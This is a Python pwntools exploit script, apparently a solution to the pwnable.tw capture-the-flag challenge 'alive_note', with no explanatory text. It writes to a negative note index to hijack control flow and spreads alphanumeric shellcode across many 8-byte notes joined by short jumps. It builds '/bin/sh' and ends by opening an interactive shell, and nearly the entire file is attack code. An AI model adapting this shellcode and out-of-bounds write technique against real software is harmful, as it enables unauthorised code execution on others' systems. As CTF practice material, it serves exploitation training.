from pwn import *
def add(index, name):
    s.recvuntil("choice :")
    s.send("1")
    s.recvuntil("Index :")
    s.send(str(index))
    s.recvuntil("Name :")
    if(len(name)==8):
        s.send(name)
    else:
        s.send(name+"\n")

def del_(index):
    s.recvuntil("choice :")
    s.send("3")
    s.recvuntil("Index :")
    s.send(str(index))

#s=remote("chall.pwnable.tw",10300)
s=process("./alive_note")
add(1,"a"*8)
add(-27,"\x70\x30"*3+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x50\x59"+"\x43"*4+"\x71\x38")
add(0,"09bin9sh")
add(3,"a"*8)
add(0,"a"*8)
add(0,"\x43"*6+"\x71\x38")
add(0,"a"*8)
add(0,"\x20")
add(0,"a"*8)
add(0,"\x43"*6+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x43"*6+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x31\x59\x61"+"\x4e"*3+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x31\x59\x65"+"\x4e"*3+"\x71\x38")
for i in range(16):
    add(0,"a"*8)
    add(0,"a"*8)
    add(0,"a"*8)
    add(0,"\x41"*6+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x41"+"\x51\x58"+"\x33\x48\x4e"+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x4b"*6+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x4b"*6+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x4b"*3+"\x31\x59\x77"+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x6b\x51\x77\x61"+"\x4e"*2+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x31\x51\x77"+"\x4e"*3+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x6b\x59\x77\x31"+"\x4b"*2+"\x71\x38")
for i in range(7):
    add(0,"a"*8)
    add(0,"a"*8)
    add(0,"a"*8)
    add(0,"\x43"*6+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x43"*5+"\x4e"+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x4a"*6+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x4a\x31\x51\x77"+"\x4e"*2+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x31\x59\x77"+"\x4e"*3+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x50\x50\x50\x50\x50\x61"+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x6b\x73\x67\x20"+"\x46"*2+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x6b\x51\x68\x20"+"\x46"*2+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x6b\x49\x68\x20"+"\x46"*2+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x46"*5+"\x56"+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x58"+"\x4e"*5+"\x71\x38")
for i in range(83):
    add(0,"a"*8)
    add(0,"a"*8)
    add(0,"a"*8)
    add(0,"\x4e"*6+"\x71\x38")

add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x78\x46")
#pause()
del_(1)
s.interactive()
s.close()
